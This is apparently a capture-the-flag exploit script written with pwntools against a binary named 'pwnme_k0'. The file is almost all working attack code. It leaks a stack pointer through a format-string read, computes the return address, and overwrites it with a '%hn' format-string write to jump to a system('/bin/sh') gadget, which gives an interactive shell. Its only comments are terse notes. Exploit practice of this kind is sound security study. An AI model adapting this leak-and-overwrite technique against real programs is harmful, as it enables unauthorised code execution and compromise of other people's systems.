from pwn import *
context.log_level = 'debug'

if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwnme_k0')

sh.recvuntil('username(max lenth:20): \n')
sh.sendline('%6$p')
sh.recvuntil('password(max lenth:20): \n')
sh.sendline('aaaa')

#gdb.attach(sh)

sh.recvuntil('>')
sh.sendline('1')

#sh.recvline()  # where is "Welc0me to sangebaimao!"
rbp = int(sh.recvline(keepends='False'), 16)
ret_addr = rbp - 0x38
print 'ret_addr= ' + hex(ret_addr)

# username: strcpy((char *)&sa, &buf); would end when meets 0x00007f
# password: memcpy((char *)&desta + 4, &src, v10);
sh.recvuntil('>')
sh.send('2')
sh.recvuntil('new username(max lenth:20): \n')
sh.send(p64(ret_addr))
# 4008a6: system('/bin/sh')
sh.recvuntil('new password(max lenth:20): \n')
payload = '%{}c'.format(0x8A6) + '%8$hn'
sh.send(payload)

sh.recvuntil('>')
sh.send('1')
sh.interactive()